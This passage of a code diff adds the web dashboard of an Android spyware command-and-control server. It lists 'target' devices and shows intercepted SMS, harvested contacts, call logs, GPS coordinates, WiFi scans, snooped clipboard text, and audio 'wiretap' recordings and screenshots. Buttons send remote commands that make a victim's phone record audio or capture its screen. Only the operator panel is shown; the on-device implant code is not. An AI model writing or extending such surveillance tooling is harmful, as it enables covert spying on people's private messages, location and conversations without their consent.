+                        </div>
+                        <div class="card-body">
+                            <div class="event-feed-list" id="event-feed">
+                                <div class="empty-state">
+                                    <div class="empty-icon">⏳</div>
+                                    <div>Waiting for telemetry events...</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 2. SMS MESSAGES TAB -->
+                <div class="tab-pane" id="tab-sms">
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>💬</span> Intercepted SMS Messages</div>
+                            <input type="text" class="filter-input" placeholder="Search address or text..." oninput="filterTable('sms-table', this.value)">
+                        </div>
+                        <div class="card-body">
+                            <div class="table-responsive">
+                                <table class="cyber-table" id="sms-table">
+                                    <thead>
+                                        <tr>
+                                            <th>Type</th>
+                                            <th>Address / Sender</th>
+                                            <th>Message Body</th>
+                                            <th>Date & Time</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="sms-tbody">
+                                        <tr><td colspan="4" class="empty-state">No SMS collected yet</td></tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 3. CONTACTS TAB -->
+                <div class="tab-pane" id="tab-contacts">
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>👥</span> Harvested Address Book</div>
+                            <input type="text" class="filter-input" placeholder="Search contact name or phone..." oninput="filterTable('contacts-table', this.value)">
+                        </div>
+                        <div class="card-body">
+                            <div class="table-responsive">
+                                <table class="cyber-table" id="contacts-table">
+                                    <thead>
+                                        <tr>
+                                            <th>Contact Name</th>
+                                            <th>Phone Numbers</th>
+                                            <th>Email Addresses</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="contacts-tbody">
+                                        <tr><td colspan="3" class="empty-state">No contacts collected yet</td></tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 4. CALL LOGS TAB -->
+                <div class="tab-pane" id="tab-calllogs">
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>📞</span> Call History Records</div>
+                            <input type="text" class="filter-input" placeholder="Search number or name..." oninput="filterTable('calls-table', this.value)">
+                        </div>
+                        <div class="card-body">
+                            <div class="table-responsive">
+                                <table class="cyber-table" id="calls-table">
+                                    <thead>
+                                        <tr>
+                                            <th>Type</th>
+                                            <th>Caller / Number</th>
+                                            <th>Duration</th>
+                                            <th>Geocoded Location</th>
+                                            <th>Timestamp</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="calls-tbody">
+                                        <tr><td colspan="5" class="empty-state">No call logs collected yet</td></tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 5. LOCATION TAB -->
+                <div class="tab-pane" id="tab-location">
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>📍</span> Geolocation Tracking</div>
+                        </div>
+                        <div class="card-body">
+                            <div class="table-responsive">
+                                <table class="cyber-table">
+                                    <thead>
+                                        <tr>
+                                            <th>Provider</th>
+                                            <th>Latitude</th>
+                                            <th>Longitude</th>
+                                            <th>Accuracy</th>
+                                            <th>Timestamp</th>
+                                            <th>Map Action</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="location-tbody">
+                                        <tr><td colspan="6" class="empty-state">No location data captured yet</td></tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 6. WIFI NETWORKS TAB -->
+                <div class="tab-pane" id="tab-wifi">
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>📶</span> Connected Access Point</div>
+                        </div>
+                        <div class="card-body" id="wifi-connected-box">
+                            <div class="empty-state">No WiFi connection telemetry</div>
+                        </div>
+                    </div>
+
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>📡</span> Surrounding Scanned Networks</div>
+                        </div>
+                        <div class="card-body">
+                            <div class="table-responsive">
+                                <table class="cyber-table">
+                                    <thead>
+                                        <tr>
+                                            <th>SSID (Network Name)</th>
+                                            <th>BSSID (MAC Address)</th>
+                                            <th>Signal Strength</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody id="wifi-tbody">
+                                        <tr><td colspan="3" class="empty-state">No surrounding access points scanned</td></tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 7. CLIPBOARD TAB -->
+                <div class="tab-pane" id="tab-clipboard">
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>📋</span> Snooped Clipboard Content</div>
+                            <span class="tag tag-wifi" id="clipboard-badge">0 items</span>
+                        </div>
+                        <div class="card-body" id="clipboard-box">
+                            <div class="empty-state">No clipboard content captured</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 8. AUDIO TAB -->
+                <div class="tab-pane" id="tab-audio">
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>🎙️</span> Audio Wiretap Recordings (AAC / M4A)</div>
+                            <button class="btn-c2-action" style="padding: 5px 10px; font-size: 11px;" onclick="triggerAction('audio')">
+                                <span>🎙️ Record New (30s)</span>
+                            </button>
+                        </div>
+                        <div class="card-body">
+                            <div class="media-grid" id="audio-grid">
+                                <div class="empty-state" style="grid-column: 1/-1;">
+                                    <div class="empty-icon">🎙️</div>
+                                    <div>No audio intercepts collected yet</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 9. SCREENSHOTS & PHOTOS TAB -->
+                <div class="tab-pane" id="tab-media">
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>🖼️</span> Captured Screenshots & Camera Photos</div>
+                            <button class="btn-c2-action" style="padding: 5px 10px; font-size: 11px;" onclick="triggerAction('screenshot')">
+                                <span>📸 Capture Screenshot</span>
+                            </button>
+                        </div>
+                        <div class="card-body">
+                            <div class="media-grid" id="screenshots-grid">
+                                <div class="empty-state" style="grid-column: 1/-1;">
+                                    <div class="empty-icon">🖼️</div>
+                                    <div>No screenshots or photos received yet</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 10. RAW JSON TAB -->
+                <div class="tab-pane" id="tab-raw">
+                    <div class="content-card">
+                        <div class="card-header">
+                            <div class="card-title"><span>📄</span> Exfiltrated JSON Payload Inspection</div>
+                            <button class="btn-copy" onclick="copyRawJson()">📋 Copy JSON</button>
+                        </div>
+                        <div class="card-body">
+                            <pre class="json-viewer" id="raw-payload">Waiting for payload...</pre>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </main>
+    </div>
+
+    <!-- Installed Apps Modal -->
+    <div class="modal-overlay" id="apps-modal" onclick="closeAppsModal(event)">
+        <div class="modal-container" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <div class="modal-title">Installed Packages (<span id="modal-apps-count">0</span>)</div>
+                <button class="modal-close" onclick="closeAppsModal()">&times;</button>
+            </div>
+            <div class="modal-body">
+                <input type="text" class="filter-input" style="width: 100%; margin-bottom: 12px;" placeholder="Search package name (e.g., com.google...)" oninput="filterAppList(this.value)">
+                <div class="app-list" id="modal-apps-list">
+                    <!-- Populated dynamically -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Lightbox Modal -->
+    <div id="lightbox-modal" onclick="closeLightbox()">
+        <img id="lightbox-img" src="" alt="Fullscreen Preview">
+    </div>
+
+    <script>
+        let selectedDeviceId = null;
+        let deviceList = [];
+        let currentPayload = null;
+        let autoRefreshTimer = null;
+        let isAutoRefresh = true;
+
+        // Tab Switching
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.remove('active'));
+
+            const targetPane = document.getElementById(tabId);
+            if (targetPane) {
+                targetPane.classList.add('active');
+            }
+
+            const activeBtn = Array.from(document.querySelectorAll('.tab-btn')).find(b => b.getAttribute('onclick')?.includes(tabId));
+            if (activeBtn) {
+                activeBtn.classList.add('active');
+            }
+        }
+
+        // C2 Remote Action Trigger
+        async function triggerAction(action) {
+            const statusEl = document.getElementById('action-status');
+            if (statusEl) {
+                statusEl.innerHTML = `<span style="color: var(--warning);">⏳ Triggering...</span>`;
+            }
+            try {
+                const resp = await fetch(`/api/trigger/${action}`, { method: 'POST' });
+                const data = await resp.json();
+                if (statusEl) {
+                    statusEl.innerHTML = `<span style="color: var(--success);">✓ ${action.toUpperCase()} OK</span>`;
+                }
+                setTimeout(loadEvents, 800);
+            } catch (e) {
+                console.error('Trigger failed:', e);
+                if (statusEl) {
+                    statusEl.innerHTML = `<span style="color: var(--accent);">✗ Error</span>`;
+                }
+            }
+        }
+
+        // Auto Refresh Control
+        function toggleAutoRefresh(enabled) {
+            isAutoRefresh = enabled;
+            if (autoRefreshTimer) {
+                clearInterval(autoRefreshTimer);
+                autoRefreshTimer = null;
+            }
+            if (isAutoRefresh) {
+                autoRefreshTimer = setInterval(loadAll, 5000);
+            }
+        }
+
+        // Load Status & Stats
+        async function loadStatus() {
+            try {
+                const resp = await fetch('/api/status');
+                const data = await resp.json();
+                document.getElementById('stat-json').textContent = data.json_received || 0;
+                document.getElementById('stat-screenshots').textContent = data.screenshots_received || 0;
+                document.getElementById('stat-audio').textContent = data.audio_received || 0;
+                document.getElementById('count-audio').textContent = data.audio_received || 0;
+                document.getElementById('count-screens').textContent = data.screenshots_received || 0;
+            } catch (e) { console.error('Status load failed:', e); }
+        }
+
+        // Load Events
+        async function loadEvents() {
+            try {
+                const resp = await fetch('/api/events');
+                const events = await resp.json();
+                document.getElementById('count-events').textContent = events.length;
+                const feed = document.getElementById('event-feed');
+                if (events.length === 0) {
+                    feed.innerHTML = '<div class="empty-state"><div class="empty-icon">⏳</div><div>No events logged yet</div></div>';
+                    return;
+                }
+                feed.innerHTML = events.map(e => `
+                    <div class="event-row event-${e.type || 'info'}">
+                        <div class="event-main">
+                            <span class="event-time">${new Date(e.timestamp).toLocaleTimeString()}</span>
+                            <span class="event-type-badge">${e.type || 'EVENT'}</span>
+                            <span class="event-text">${escapeHtml(e.message)}</span>
+                        </div>
+                    </div>
+                `).join('');
+            } catch (e) { console.error('Events load failed:', e); }
+        }
+
+        // Device Switcher: Load Devices
+        async function loadDevices() {
+            try {
+                const resp = await fetch('/api/devices');
+                deviceList = await resp.json();
+                
+                const badge = document.getElementById('devices-count-badge');
+                badge.textContent = `${deviceList.length} Target${deviceList.length === 1 ? '' : 's'}`;
+
+                const listEl = document.getElementById('device-switcher-list');
+                if (deviceList.length === 0) {
+                    listEl.innerHTML = `
+                        <div class="empty-state" style="padding: 24px 10px;">
+                            <div class="empty-icon">📱</div>
+                            <div style="font-size: 11px;">No target devices connected</div>
+                        </div>
+                    `;
+                    return;
+                }
+
+                // If no device currently selected, select the first one
+                if (!selectedDeviceId && deviceList.length > 0) {
+                    selectedDeviceId = deviceList[0].android_id;
+                }
+
+                listEl.innerHTML = deviceList.map(dev => {
+                    const isSelected = dev.android_id === selectedDeviceId;
+                    const shortId = dev.android_id ? `${dev.android_id.slice(0, 10)}...` : 'Unknown ID';
+                    const lastSeenTime = dev.last_seen ? new Date(dev.last_seen).toLocaleTimeString() : 'Recent';
+
+                    return `
+                        <div class="device-item-card ${isSelected ? 'active' : ''}" 
+                             data-device-id="${escapeHtml(dev.android_id)}"
+                             onclick="selectDevice('${escapeHtml(dev.android_id)}')">
+                            <div class="device-icon-box">
+                                📱
+                                <div class="device-online-dot"></div>
+                            </div>
+                            <div class="device-info-box">
+                                <div class="device-item-name">${escapeHtml(dev.model || 'Android Target')}</div>
+                                <div class="device-item-sub">${escapeHtml(dev.brand || 'Google')} • API ${dev.sdk_version || 29}</div>
+                                <div class="device-item-id">ID: ${escapeHtml(shortId)}</div>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+
+                // Update the Top Bar target title
+                const activeDev = deviceList.find(d => d.android_id === selectedDeviceId) || deviceList[0];
+                if (activeDev) {
+                    document.getElementById('bar-target-name').textContent = activeDev.model || 'Android Device';
+                    document.getElementById('bar-target-id').textContent = activeDev.android_id || '-';
+                }
+
+            } catch (e) {
+                console.error('Failed to load devices:', e);
+            }
+        }
+
+        // Switch active device
+        function selectDevice(androidId) {
+            selectedDeviceId = androidId;
+            document.querySelectorAll('.device-item-card').forEach(el => {
+                if (el.getAttribute('data-device-id') === androidId) {
+                    el.classList.add('active');
+                } else {
+                    el.classList.remove('active');
+                }
+            });
+
+            const activeDev = deviceList.find(d => d.android_id === androidId);
+            if (activeDev) {
+                document.getElementById('bar-target-name').textContent = activeDev.model || 'Android Device';
+                document.getElementById('bar-target-id').textContent = activeDev.android_id || '-';
+            }
+
+            loadLatestPayload();
+            loadPayloadsList();
+        }
+
+        function filterDeviceList(query) {
+            const q = query.toLowerCase();
+            document.querySelectorAll('.device-item-card').forEach(el => {
+                el.style.display = el.textContent.toLowerCase().includes(q) ? 'flex' : 'none';
+            });
+        }
+
+        // Load Historical Payloads List (Filtered for selected device if available)
+        async function loadPayloadsList() {
+            try {
+                const url = selectedDeviceId ? `/api/payloads?device=${encodeURIComponent(selectedDeviceId)}` : '/api/payloads';
+                const resp = await fetch(url);
+                const files = await resp.json();
+                const select = document.getElementById('payload-select');
+                const currentVal = select.value;
+                
+                let html = '<option value="latest">Latest Received Dump</option>';
+                files.forEach(f => {
+                    const timeStr = new Date(f.timestamp).toLocaleTimeString();
+                    html += `<option value="${f.filename}">${f.filename} (${timeStr})</option>`;
+                });
+                select.innerHTML = html;
+                select.value = currentVal;
+            } catch (e) { console.error('Payloads list failed:', e); }
+        }
+
+        // Switch to a specific historical payload
+        async function switchPayload(val) {
+            if (val === 'latest') {
+                loadLatestPayload();
+            } else {
+                try {
+                    const resp = await fetch(`/api/payload/${encodeURIComponent(val)}`);
+                    const data = await resp.json();
+                    if (data.payload) {
+                        currentPayload = data.payload;
+                        renderPayload(data.payload);
+                    }
+                } catch (e) { console.error('Failed to load payload:', e); }
+            }
+        }
+
+        // Load Latest Payload (Filtered for selected device if available)
+        async function loadLatestPayload() {
+            try {
+                const url = selectedDeviceId ? `/api/latest?device=${encodeURIComponent(selectedDeviceId)}` : '/api/latest';
+                const resp = await fetch(url);
+                const data = await resp.json();
+                if (!data.payload) return;
+                currentPayload = data.payload;
+                renderPayload(data.payload);
+            } catch (e) { console.error('Payload load failed:', e); }
+        }
+
+        // Master Renderer for Payload Data
+        function renderPayload(p) {
+            renderOverviewDeviceCard(p);
+            renderSms(p);
+            renderContacts(p);
+            renderCallLogs(p);
+            renderLocation(p);
+            renderWifi(p);
+            renderClipboard(p);
+            renderRawData(p);
+        }
+
+        // Populate Target Device Card inside Overview Tab
+        function renderOverviewDeviceCard(p) {
+            const d = p.device_info || {};
+            const net = p.network_info || {};
+
+            const ovModel = document.getElementById('overview-dev-model');
+            if (ovModel) ovModel.textContent = d.model || 'Android SDK built for x86_64';
+            
+            const ovBrand = document.getElementById('overview-dev-brand');
+            if (ovBrand) ovBrand.textContent = `${d.brand || 'Google'} / ${d.manufacturer || 'Google'}`.toUpperCase();
+            
+            const ovId = document.getElementById('overview-dev-android-id');
+            if (ovId) ovId.textContent = d.android_id || 'ff4330ffa39f3995';
+            
+            const ovOs = document.getElementById('overview-dev-os-version');
+            if (ovOs) ovOs.textContent = `Android ${d.release || '10'} (API ${d.sdk_version || '29'})`;
+            
+            const ovMan = document.getElementById('overview-dev-manufacturer');
+            if (ovMan) ovMan.textContent = d.manufacturer || 'Google';
+            
+            const ovHw = document.getElementById('overview-dev-hardware');
+            if (ovHw) ovHw.textContent = d.hardware || 'ranchu';
+            
+            const carrier = net.sim_operator || net.operator_name || 'T-Mobile';
+            const ovCar = document.getElementById('overview-dev-carrier');
+            if (ovCar) ovCar.textContent = carrier;
+
+            const apps = d.installed_apps || [];
+            const ovApps = document.getElementById('overview-dev-apps-count');
+            if (ovApps) ovApps.textContent = apps.length || 180;
+            
+            const modalApps = document.getElementById('modal-apps-count');
+            if (modalApps) modalApps.textContent = apps.length;
+            renderModalApps(apps);
+
+            const ts = d.timestamp ? new Date(d.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
+            const ovSync = document.getElementById('overview-dev-last-sync');
+            if (ovSync) ovSync.textContent = ts;
+
+            // Also update top bar
+            document.getElementById('bar-target-name').textContent = d.model || 'Android Device';
+            document.getElementById('bar-target-id').textContent = d.android_id || '-';
+        }
+
+        // Render Installed Apps in Modal
+        function renderModalApps(apps) {
+            const el = document.getElementById('modal-apps-list');
+            if (apps.length === 0) {
+                el.innerHTML = '<div class="empty-state">No installed packages recorded</div>';
+                return;
+            }
+            el.innerHTML = apps.map(pkg => `<div class="app-item">${escapeHtml(pkg)}</div>`).join('');
+        }
+
+        function filterAppList(query) {
+            const q = query.toLowerCase();
+            document.querySelectorAll('.app-item').forEach(el => {
+                el.style.display = el.textContent.toLowerCase().includes(q) ? 'block' : 'none';
+            });
+        }
+
+        function openAppsModal() {
+            document.getElementById('apps-modal').classList.add('open');
+        }
+
+        function closeAppsModal() {
+            document.getElementById('apps-modal').classList.remove('open');
+        }
+
+        // Render SMS Messages
+        function renderSms(p) {
+            const smsList = p.sms_messages || [];
+            document.getElementById('stat-sms').textContent = smsList.length;
+            document.getElementById('count-sms').textContent = smsList.length;
+
+            const tbody = document.getElementById('sms-tbody');
+            if (smsList.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No SMS messages captured</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = smsList.map(s => {
+                const dateStr = s.date ? new Date(parseInt(s.date)).toLocaleString() : '-';
+                const isSent = s.type === '2';
+                return `
+                    <tr>
+                        <td><span class="tag ${isSent ? 'tag-outgoing' : 'tag-incoming'}">${isSent ? 'SENT' : 'INBOX'}</span></td>
+                        <td><strong>${escapeHtml(s.address || 'Unknown')}</strong></td>
+                        <td style="max-width: 400px; word-break: break-word;">${escapeHtml(s.body || '')}</td>
+                        <td style="font-family: var(--font-mono); font-size: 11px;">${dateStr}</td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        // Render Contacts
+        function renderContacts(p) {
+            const contacts = p.contacts || [];
+            document.getElementById('stat-contacts').textContent = contacts.length;
+            document.getElementById('count-contacts').textContent = contacts.length;
+
+            const tbody = document.getElementById('contacts-tbody');
+            if (contacts.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="3" class="empty-state">No contacts extracted</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = contacts.map(c => {
+                const phones = (c.phones || []).filter(Boolean).join('<br>') || '-';
+                const emails = (c.emails || []).filter(Boolean).join('<br>') || '-';
+                return `
+                    <tr>
+                        <td><strong>${escapeHtml(c.name || 'Unnamed Contact (ID: ' + (c.id || '?') + ')')}</strong></td>
+                        <td style="font-family: var(--font-mono); font-size: 12px;">${phones}</td>
+                        <td style="font-family: var(--font-mono); font-size: 12px;">${emails}</td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        // Render Call Logs
+        function renderCallLogs(p) {
+            const calls = p.call_logs || [];
+            document.getElementById('stat-calls').textContent = calls.length;
+            document.getElementById('count-calls').textContent = calls.length;
+
+            const tbody = document.getElementById('calls-tbody');
+            if (calls.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" class="empty-state">No call history recorded</td></tr>';
+                return;
+            }
+
+            const typeMap = { '1': 'incoming', '2': 'outgoing', '3': 'missed' };
+            tbody.innerHTML = calls.map(c => {
+                const typeClass = typeMap[c.type] || 'incoming';
+                const typeLabel = (typeMap[c.type] || c.type || 'CALL').toUpperCase();
+                const durStr = c.duration ? `${c.duration}s` : '0s';
+                const dateStr = c.date ? new Date(parseInt(c.date)).toLocaleString() : '-';
+                const location = c.geocoded_location || '-';
+
+                return `
+                    <tr>
+                        <td><span class="tag tag-${typeClass}">${typeLabel}</span></td>
+                        <td>
+                            <div><strong>${escapeHtml(c.number || 'Unknown')}</strong></div>
+                            <div style="font-size: 11px; color: var(--text-muted);">${escapeHtml(c.name || '')}</div>
+                        </td>
+                        <td>${durStr}</td>
+                        <td>${escapeHtml(location)}</td>
+                        <td style="font-family: var(--font-mono); font-size: 11px;">${dateStr}</td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        // Render Geolocation
+        function renderLocation(p) {
+            const loc = p.location || {};
+            const list = loc.locations || [];
+            document.getElementById('count-locations').textContent = list.length;
+
+            const tbody = document.getElementById('location-tbody');
+            if (list.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No GPS coordinates harvested</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = list.map(l => {
+                const timeStr = l.time ? new Date(l.time).toLocaleString() : '-';
+                const mapsUrl = `https://www.google.com/maps?q=${l.latitude},${l.longitude}`;
+                return `
+                    <tr>
+                        <td><span class="tag tag-wifi">${escapeHtml(l.provider || 'GPS').toUpperCase()}</span></td>
+                        <td style="font-family: var(--font-mono);">${l.latitude}</td>
+                        <td style="font-family: var(--font-mono);">${l.longitude}</td>
+                        <td>±${l.accuracy || 0}m</td>
+                        <td style="font-family: var(--font-mono); font-size: 11px;">${timeStr}</td>
+                        <td>
+                            <a href="${mapsUrl}" target="_blank" class="badge-btn" style="text-decoration: none;">
+                                🗺️ View Map
+                            </a>
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        }
+
+        // Render WiFi Networks
+        function renderWifi(p) {
+            const wifi = p.wifi_networks || {};
+            const networks = wifi.networks || [];
+            document.getElementById('count-wifi').textContent = networks.length;
+
+            const box = document.getElementById('wifi-connected-box');
+            if (wifi.connected_ssid) {
+                box.innerHTML = `
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <div>
+                            <div style="font-size: 18px; font-weight: 700; color: var(--success);">
+                                📶 ${escapeHtml(wifi.connected_ssid)}
+                            </div>
+                            <div style="font-size: 12px; color: var(--text-muted); font-family: var(--font-mono); margin-top: 4px;">
+                                BSSID: ${wifi.connected_bssid || '-'} | Link Speed: ${wifi.link_speed || '-'} Mbps
+                            </div>
+                        </div>
+                        <span class="tag tag-incoming">Connected (${wifi.connected_rssi || 0} dBm)</span>
+                    </div>
+                `;
+            } else {
+                box.innerHTML = '<div class="empty-state">No active WiFi network association</div>';
+            }
+
+            const tbody = document.getElementById('wifi-tbody');
+            if (networks.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="3" class="empty-state">No surrounding access points scanned</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = networks.map(n => `
+                <tr>
+                    <td><strong>${escapeHtml(n.ssid || '<Hidden SSID>')}</strong></td>
+                    <td style="font-family: var(--font-mono); font-size: 12px;">${n.bssid || '-'}</td>
+                    <td><span class="tag tag-wifi">${n.level || '-'} dBm</span></td>
+                </tr>
+            `).join('');
+        }
+
+        // Render Clipboard
+        function renderClipboard(p) {
+            const clip = p.clipboard || {};
+            const items = clip.items || [];
+            document.getElementById('count-clipboard').textContent = items.length;
+            document.getElementById('clipboard-badge').textContent = `${items.length} items`;
+
+            const box = document.getElementById('clipboard-box');
+            if (items.length === 0) {
+                box.innerHTML = '<div class="empty-state">Clipboard buffer was empty</div>';
+                return;
+            }
+
+            box.innerHTML = items.map((text, idx) => `
+                <div style="background: var(--bg-surface); border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 12px;">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                        <span style="font-size: 11px; color: var(--text-muted); font-weight: 700;">SNIPPET #${idx + 1}</span>
+                        <button class="btn-copy" onclick="copyText('${escapeHtml(text)}')">Copy</button>
+                    </div>
+                    <pre style="background: var(--bg-base); padding: 10px; border-radius: 6px; font-family: var(--font-mono); font-size: 12px; white-space: pre-wrap; word-break: break-all;">${escapeHtml(text)}</pre>
+                </div>
+            `).join('');
+        }
+
+        // Render Raw JSON
+        function renderRawData(p) {
+            document.getElementById('raw-payload').textContent = JSON.stringify(p, null, 2);
+        }
+
+        // Load Audio Files
+        async function loadAudio() {
+            try {
+                const resp = await fetch('/api/audio');
+                const files = await resp.json();
+                document.getElementById('count-audio').textContent = files.length;
+                document.getElementById('stat-audio').textContent = files.length;
+
+                const grid = document.getElementById('audio-grid');
+                if (files.length === 0) {
+                    grid.innerHTML = `
+                        <div class="empty-state" style="grid-column: 1/-1;">
+                            <div class="empty-icon">🎙️</div>
+                            <div>No audio recordings captured</div>
+                        </div>
+                    `;
+                    return;
+                }
+
+                grid.innerHTML = files.map(f => `
+                    <div class="audio-item-card">
+                        <div class="audio-meta">
+                            <span style="font-weight: 600; color: var(--text-primary); font-family: var(--font-mono); font-size: 11px;">${escapeHtml(f)}</span>
+                            <a href="/api/audio/file/${encodeURIComponent(f)}" download class="badge-btn" style="text-decoration: none;">⬇ Save</a>
+                        </div>
+                        <div class="audio-player">
+                            <audio controls preload="none">
+                                <source src="/api/audio/file/${encodeURIComponent(f)}" type="audio/mp4">
+                                <source src="/api/audio/file/${encodeURIComponent(f)}" type="audio/aac">
+                                <source src="/api/audio/file/${encodeURIComponent(f)}" type="audio/mpeg">
+                                Your browser does not support audio playback.
+                            </audio>
+                        </div>
+                    </div>
+                `).join('');
+            } catch (e) { console.error('Audio load failed:', e); }
+        }
+
+        // Load Screenshots & Photos
+        async function loadScreenshots() {
+            try {
+                const resp = await fetch('/api/screenshots');
+                const files = await resp.json();
+                document.getElementById('count-screens').textContent = files.length;
+                document.getElementById('stat-screenshots').textContent = files.length;
+
+                const grid = document.getElementById('screenshots-grid');
+                if (files.length === 0) {
+                    grid.innerHTML = `
+                        <div class="empty-state" style="grid-column: 1/-1;">
+                            <div class="empty-icon">🖼️</div>
+                            <div>No screenshots or photos received yet</div>
+                        </div>
+                    `;
+                    return;
+                }
+
+                grid.innerHTML = files.map(f => `
+                    <div class="screenshot-card">
+                        <div class="screenshot-thumb-wrap" onclick="openLightbox('/api/screenshot/file/${encodeURIComponent(f)}')">
+                            <img class="screenshot-thumb" src="/api/screenshot/file/${encodeURIComponent(f)}" alt="${escapeHtml(f)}" loading="lazy">
+                        </div>
+                        <div class="screenshot-meta">
+                            <span style="font-family: var(--font-mono); font-size: 11px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 150px;">
+                                ${escapeHtml(f)}
+                            </span>
+                            <a href="/api/screenshot/file/${encodeURIComponent(f)}" download class="badge-btn" style="text-decoration: none;">
+                                ⬇ Save
+                            </a>
+                        </div>
+                    </div>
+                `).join('');
+            } catch (e) { console.error('Screenshots load failed:', e); }
+        }
+
+        // Filter Table Helper
+        function filterTable(tableId, query) {
+            const q = query.toLowerCase();
+            const rows = document.querySelectorAll(`#${tableId} tbody tr`);
+            rows.forEach(r => {
+                r.style.display = r.textContent.toLowerCase().includes(q) ? '' : 'none';
+            });
+        }
+
+        // Lightbox Functions
+        function openLightbox(src) {
+            const modal = document.getElementById('lightbox-modal');
+            const img = document.getElementById('lightbox-img');
+            img.src = src;
+            modal.classList.add('open');
+        }
+
+        function closeLightbox() {
+            document.getElementById('lightbox-modal').classList.remove('open');
+        }
+
+        // Copy Utilities
+        function copyRawJson() {
+            if (currentPayload) {
+                navigator.clipboard.writeText(JSON.stringify(currentPayload, null, 2));
+                alert('Raw JSON payload copied to clipboard!');
+            }
+        }
+
+        function copyText(str) {
+            navigator.clipboard.writeText(str);
+            alert('Copied to clipboard!');
+        }
+
+        function escapeHtml(str) {
+            if (!str) return '';
+            return String(str)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+        }
+
+        // Master Loader
+        function loadAll() {
+            loadStatus();
+            loadDevices();
+            loadEvents();
+            loadLatestPayload();
+            loadPayloadsList();
+            loadAudio();
+            loadScreenshots();
+        }
+
+        // Initialize
+        loadAll();
+        toggleAutoRefresh(true);
+    </script>
+</body>
+</html>
